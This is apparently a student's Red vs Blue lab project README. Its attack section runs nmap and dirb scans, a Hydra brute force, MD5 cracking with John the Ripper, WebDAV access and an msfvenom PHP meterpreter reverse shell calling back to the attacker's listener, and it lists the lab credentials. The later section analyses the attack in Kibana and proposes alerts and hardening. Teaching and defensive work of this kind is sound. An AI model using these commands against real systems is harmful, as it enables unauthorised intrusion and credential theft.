## Red Vs. Blue Team Project

### Unit Description

In this project, you will be playing a role of both a pentester and SOC Analyst and will work on a Red Team vs. Blue Team scenario.

As the Red Team, you will attack a vulnerable VM within your environment in an effort to take control and gain root access to the machine. You will be using Kibana as the Blue Team and analyze logs of the attacking engagement from Red Team. using the logs to get precise information and visuals for a report.
Following that, you will analyze your log data to offer mitigation strategies for each exploit you've successfully used.


### Unit Objectives

<details>
    <summary>Click here to view the daily unit objectives.</summary>
<br>

This week's project will prompt you to apply knowledge of the following skills and tools:

- Penetration testing with Kali Linux.

- Log and incident analysis with Kibana.

- System hardening and configuration.

- Reporting, documentation, and communication.


</details>

### Lab Environment

<details>

<summary>Click here to view the lab environnement.</summary>

<br>

In this unit, you will be using the Red vs Blue lab environment located in Windows Azure Lab Services. RDP into the Windows RDP host machine using the following credentials:

Username: `azadmin`
Password: `p4ssw0rd*`

Open the Hyper-V Manager to access the nested machines:

- **ELK machine credentials:** The same ELK setup that you created in Project 1. It holds the Kibana dashboards.
    - Username: `vagrant`
    - Password: `vagrant`
    - IP Address: `192.168.1.100`

- **Kali:** A standard Kali Linux machine for use in the penetration test on Day 1. 
    - Username: `root`
    - Password: `toor`
    - IP Address: `192.168.1.90`

- **Capstone:** Filebeat and Metricbeat are installed and will forward logs to the ELK machine. 
   - IP Address: `192.168.1.105`
   - Please note that this VM is in the network solely for the purpose of testing alerts.
  

</details>

---

![Network Diagram](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Diagram/networktopology.png)

### Description of the Topology

The main purpose of this network is to expose an attack within a vulnerable VM within your environment. After, we will be collecting logs and data from the attack and analyzing the extracted data and visualize the results. We will be using Azure Lab Services. RDP into the Windows RDP host machine and then opening the Hyper-V Manager to access the nested machines: 
- Kali VM - Attacker Machine
- Capstone VM - Targeting Machine
- ELK VM - Network monitoring with Kibana to use the logs to extract data and visualizations 

---

### Monitoring Setup

We will be installing FileBeat, MetricBeat and PacketBeat onto our Capstone VM, so we can collect the logs as the attack is taking place in our server.

**Instructions**

- Double click on the 'HyperV Manager' Icon on the Desktop to open the HyperV Manager.

- Choose the `Capstone` machine from the list of Virtual Machines and double-click it to get a terminal window.

- Login to the machine using the credentials: `vagrant:tnargav`

- Switch to the root user with `sudo su`

#### Setup Filebeat

Run the following commands:
- `filebeat modules enable apache`
- `filebeat setup`

The output should look like this:

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/filebeat.PNG)

#### Setup Metricbeat

Run the following commands:
- `metricbeat modules enable apache`
- `metricbeat setup`

The output should look like this:

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/metricbeat.PNG)

#### Setup Packetbeat

Run the following command:
- `packetbeat setup`

The output should look like this:

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/packetbeat.PNG)

Restart all 3 services. Run the following commands:
- `systemctl restart filebeat`
- `systemctl restart metricbeat`
- `systemctl restart packetbeat`

_Note:These restart commands should not give any output:_

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/restartsystemctl.PNG)


Once all three of these have been enabled, close the terminal window for this machine and proceed with your attack.


## Red Team

We will be exploiting a vulnerable Capstone VM by discovering an IP address in the server, locate the hidden directory on the server, using Brute to gain access in the hidden directory, connect to server via WebDAV force,  upload a PHP reverse shell, and find and capture the flag within the hidden directory.

#### Setup
We will be using Kali Linux Machine to attack the vulnerable Capstone VM.
- Inside the HyperV Manager, click on Kali machine and login with the credentials: `root:toor`
 
 
### Step 1: Discover IP address of the Linux server
Identify the IP address of Kali VM with command: `ifconfig`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/ifconfigkali.PNG)

To discover the IP address we will need to use Nmap to scan your network. 
- Opening Kali terminal, using the command: `nmap 192.168.1.0/24`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/nmap.PNG)

Netdiscover is another tool that can be used to inspect IP address and network ARP traffic. 
- Command used: `netdiscover -r 192.168.1.0/24

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/netdiscover.PNG)

Nmap discovered 256 IP addresses with 4 hosts up. On VM IP address: 192.168.1.105, there were 2 open ports: 22 and 80 which was interesting. To determine the versions of the service running on the ports, use the command: `nmap -sV 192.168.1.105` 

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/svnmap.PNG)


Using `dirb` , as a web content scanner, we can locate hidden and existing directory web objects. Another method since port 80 is open, we can open a web browser and put in the ip address: `192.168.1.105`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/dirb.png)


![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/hiddendirectory.PNG)


### Step 2: Locate the hidden directory on the server.
Navigating through the directory comes to a folder called `secret_folder` which asks for authentication in order to access. Reading the authentication method reads "For Asthon's eyes only."

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/companyfolders1.PNG)
![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/secret.PNG)
![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/secretfolder.PNG)


### Step 3: Brute force the password for the hidden directory.
We will find Asthon's username and password by brute force against the hidden directory by using Hydra.
- Using Ashton's name, run the Hydra attack against the directory:
	- Using the command: `hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /customer_folders/secret_folder`
- Once brute force attack is finished, you will find the username is `ashton` and the password is `leopoldo`.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/ashtonpass.PNG)

- After logging in with the credentials, navigate on the browser to the secret folder and will go to connect_to_corp_server page indicating a personal note left by Asthon of how to connect to the companies webdavserver with Ryan's account information.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/note.PNG)

- Break the hashed password with Crack station website or John the Ripper.
	- For John the Ripper, use the command: `john  --format=raw-md5 ryan_hash`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/john.PNG)

	- Using https://crackstation.net to crack the hash, paste the password hash and fill out the CAPTCHA; and click on Crack Hashes:

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/crack.PNG)

- Breaking the hashed password reviewed Ryan's password is `linux4u`.


### Step 4: Connect to the server via WebDAV

Connect to the VM's WebDAV directory by following the instructions on the secret_folder.
- Open the `File System` on the desktop.
- Click on `Browse Network`.
- In the URL bar, type: dav:192.168.1.105/webdav
- Enter the credentials: 
	- Username: `ryan` 
	- Password: `linux4u`


![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/webdav.PNG)


### Step 5: Upload a PHP reverse shell payload.
- Using MSFVenom, we will set up a reverse shell, the command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/msfvenom.PNG)

- Setting up a listener by following a series of command:
	- `msfconsole` to launch `msfconsole`
	- `use exploit/multi/handler` 
	- `set payload php/meterpreter/reverse_tcp`
	- `show options and point out they need to set the `LHOST` and `LPORT`.
	- `set LHOST 192.168.1.90`
	- `set LPORT 4444`
	- `exploit`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/msf1.PNG)

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/msf2.PNG)

- When exploit is set up, we will place the shell.php file inside the webDAV. Once placed in the webDAV, we will activate the payload and open up a meterpreter session.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/shell.PNG)


### Step 6: Find and capture the flag.
- On the listener, we will search for the flag found inside the `root` directory, which is named `flag.txt`
	- Run command: `shell`
	- `locate flag.txt`
	- `cat /flag.txt`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/flag.PNG)	

---


## Blue Team

We will be investigating the incident using Kibana to analyze the logs that took place when Red team attacked. 
We will be viewing logs on Kibana by importing filebeat, metricbeat and packetbeat data, but first we will have to add Kibana log datas and then create a dashboard for visualization.

<details>
    <summary>Click here to view on how to add Kibana Log Data and Creating a Dashboard for Visualization </summary>
<br>

#### Adding Kibana Log Data

To start viewing logs in Kibana, we will need to import our filebeat, metricbeat and packetbeat data.

Double-click the Google Chrome icon on the Windows host's desktop to launch Kibana. If it doesn't load as the default page, navigate to http://192.168.1.105:5601.

This will open 4 tabs automatically, but for now, we only want to use the first tab.

Click on the `Explore My Own` link to get started.

	
##### Adding Appache logs

- Click on `Add Log Data`
- Click on `Apache logs` 
- Scroll to the bottom of the page. 
- Click on `Check Data`
You should see a message highlighted in green: `Data successfully received from this module`
	
![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/apache.PNG)


Return to the Home screen by moving back 2 pages.

	
##### Adding System Logs
- Click on `Add Log Data`
- Click on `System logs` 
- Scroll to the bottom of the page. 
- Click on `Check Data`
You should see a message highlighted in green: `Data successfully received from this module`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/systems.PNG)

Return to the Home screen by moving back 2 pages.

	
#### Adding Apache Metrics
- Click on `Add Metric Data`
- Click on `Apache Metrics` 
- Scroll to the bottom of the page. 
- Click on `Check Data`
You should see a message highlighted in green: `Data successfully received from this module`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/metricsapache.PNG)


Return to the Home screen by moving back 2 pages.


#### Adding System Metrics
- Click on `Add Metric Data`
- Click on `System Metrics` 
- Scroll to the bottom of the page. 
- Click on `Check Data`
You should see a message highlighted in green: `Data successfully received from this module`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/systemmetrics.PNG)

Close Google Chrome and all of it's tabs. Double click on Chrome to re-open it.

	
#### Dashboard Creation

We will create visualization of our data to write for report.
- Click on Dashboards on the left navigation panel.
- Click on Create Dashboard in right upper hand side. 

On the new page click on **Add an existing** to add the following existing reports:

- `HTTP status codes for the top queries [Packetbeat] ECS`
- `Top 10 HTTP requests [Packetbeat] ECS`
- `Network Traffic Between Hosts [Packetbeat Flows] ECS`
- `Top Hosts Creating Traffic [Packetbeat Flows] ECS`
- `Connections over time [Packetbeat Flows] ECS`
- `HTTP error codes [Packetbeat] ECS`
- `Errors vs successful transactions [Packetbeat] ECS`
- `HTTP Transactions [Packetbeat] ECS`

After adding the dashboard it should look like below images: 

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/dash1.PNG)
![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/dash2.PNG)

</details>

---


### Log Analysis and Attach Characterization

After dashboard is created, we will use the visualization to answer the following questions below:

### 1. Identify the offensive traffic:
Identify the traffic between your machine and the web machine:
- Run the command on the Discover page of Kibana: `source.ip: 192.168.1.90 and destination.ip: 192.168.1.105` which indicates the source IP of Kali machine and your destination machine (your web server).
- Run `url.path: /company_folders/secret_folder/`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue1.PNG)

The following responses: `401`, `301`, `200`, `207`, `303` returned shown in the images below:

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue2.PNG)

Identifying the Port scan:
- The port scan (192.168.1.90) occurred on July 23, 2022 @ 15:00. 
- There were a total of 133,288 packets sent from 192.168.1.90. 
- There was an increased activity spike in the network traffic that helps identify the port scans. 
- We can see a spike in the Connections over time [Packetbeat Flows] ECS and Errors vs successful transactions [Packetbeat] ECS.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue3.PNG)

### 2. Find the Request for the Hidden Directory
Looking at the interaction between the attacking machine with the webserver. 

- Request occurred on July 23, 2022 @ ~15:00. The secret_folder was requested 16,213 times, as shown in the Top 10 HTTP requests [Packetbeat] ECS panel.
- Files within the secret_folder was obtained when logging into Ashton's account which then lead us to connect_to_corp_server and contained sensitive information. 
- Inside the secret folder revealed sensitive information on Ryan’s account password and instructions on how to navigate into Ryan’s webDAV server.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue4.PNG)

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue5.PNG)

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue6.PNG)


#### Mitigation: 
>What kind of alarm would you set to detect this behavior in the future?

- Set an alarm alert that goes off for any machine that attempts to access the directory or file. 
- Set an alarm that sets off when a user from non-whitelisted IP address tries to access directory.
- Setting a threshold of 2-3 attempts every 20 minutes that would trigger an alert to be sent to SOC analyst.


>Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- Directory file should be removed from the server. 
- Store files in the central database and not directly in web server file systems and definite own resource names used to access the files.
- Whitelisting permitted name and/or characters of file names or paths from user inputs. Blacklisting characters to filter out ../ and strings not recommended. 
- Mitigating vulnerability on web server side, ensure using up-to-date web server software. Running minimum privileges and only have access to directories that the website or application actually needs. 
- Detecting these vulnerabilities by regularly scan your websites and web applications.
- Encrypt data file that are confidential.


### 3. Identify the Brute Force Attack

After identifying the hidden directory, Hydra was used to brute-force the target server. 

Packets from Hydra was identified using the following search functions on the Discovery page of Kibana: 
- search: `url.path: /company_folders/secret_folder/` and look through results and notice `Hydra` is identified under `user_agent.original` as shown in the image below:

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue8.PNG)

- search: `source.ip: 192.168.1.90 AND destination.ip:192.168.1.105 AND http.response.status_code:401 AND url.path:/company_folders/secret_folder AND user_agent.original:"Mozilla/4.0 (Hydra)"`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue7.PNG)

- There were 16,205 requests made in the attack. Within the 16,205 requests, 2 requests was made before discovering the password as shown illustrated in HTTP Transactions [PacketBeat] ECS panel.
- The HTTP status codes for the top queries [PacketBeat] ECS panel shows the breakdown of 401 unauthorized status codes as opposed to 200 OK status codes.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue9.PNG)
- The Connections over time [Packetbeat Flows] ECS panel shows a connection spike.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue10.PNG)

#### Mitigation: 
>What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?

- Set an alert if 401 unauthorized status code is returned back from any server. 
- Set threshold of 10 login attempts per hour and refine from there.
- Set alert if user_agent.original value includes Hydra in the name.

>Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- Create a password policy for the company - an assigned unique user account and password requirements such as new passwords to be created and will expire every 90 days and must be changed.
- Accounts shall be locked after six failed login attempts within 30 minutes and shall remain locked for at least 30 minutes or until the System Administrator unlocks the account.
- Apply the NIST 800-63B framework for password requirements. Limit failed login attempts and logins to specific IP address or range.
- Strong protected passwords using Captcha and Two-Factor Authentication.


### 4. Find the WebDav Connection

- In the Top 10 HTTP requests [Packetbeat] ECS panel, 98 requests were made in the webDAV directory and 52 requests were made in the webDAV/shell.php. 
- Within the webDAV directory, two files found named passwd.dav and shell.php.

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue11.PNG)

#### Mitigation: 
>What kind of alarm would you set to detect such access in the future?

- Set an alert each time another machine other than main machine accessing the directory. 
- Set a threshold of > 0 whenever resources from webDAV is accessed from an external IP address

>Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- WebDAV operates over the web via HTTP, securing transactions with SSL to switch the site to HTTPS schema. The webserver will be able to negotiate connections with HTTPS instead of HTTP. 
- Using a vulnerability management tool such as Automated Vulnerability Detection System (AVDS) to detect webDAV in your web application. 
- Disabling webDAV when not in use. 
- Web application firewall with a rule that restrict access to shared folder.
- Connections to this shared folder should not be accessible from the web interface.


### 5. Identify the Reverse Shell and meterpreter Traffic
A PHP reverse shell to the targets machine and started a meterpreter shell session. 

To identify the meterpreter session, on the Discovery page of Kibana, we can use the search function:
- `source.ip: 192.168.1.90 AND destination.ip:192.168.1.105 AND query:"GET /webdav/shell.php"`
- `source.ip: 192.168.1.105 and destination.port: 4444`

![](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Images/blue12.PNG)

#### Mitigation: 
>What kinds of alarms would you set to detect this behavior in the future?

- Set an alert for any traffic moving over port 4444.
- Set an alert threshold of one attempt for any .php file that is uploaded to a server.

>Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- Removing the ability to upload files to this directory over the web interface would take care of this issue. Store uploaded files in a location not accessible from the web
- Only allow users with authentication to upload files and define valid types of files that the users should be allowed to upload.
- Improve web application security with web application firewalls
- Company should implement NISTIR 7316 framework for assess control management.


---


### Additional Reading and Resources

<details> 
<summary> Click here to view additional reading materials and resources. </summary>
</br>

- [Red Team Vs Blue Team](https://securitytrails.com/blog/cybersecurity-red-blue-team)
- [What is Vulnerability Scanning](https://www.esecurityplanet.com/network-security/vulnerability-scanning.html)
- [What is a reverse shell](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/)
- [Kibana: Discover Documentation](https://www.elastic.co/guide/en/kibana/7.7/discover.html)
- [Kibana: Visualize Documentation](https://www.elastic.co/guide/en/kibana/7.7/visualize.html)
- [Elasticsearch Reference Documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html)


</details>

---

### Presentation
To view the Presentation for this project please click [here](https://github.com/raospiratory/Red-vs-Blue-Project/blob/main/Presentation/PROJECT2REDVBLUE.pdf).

---
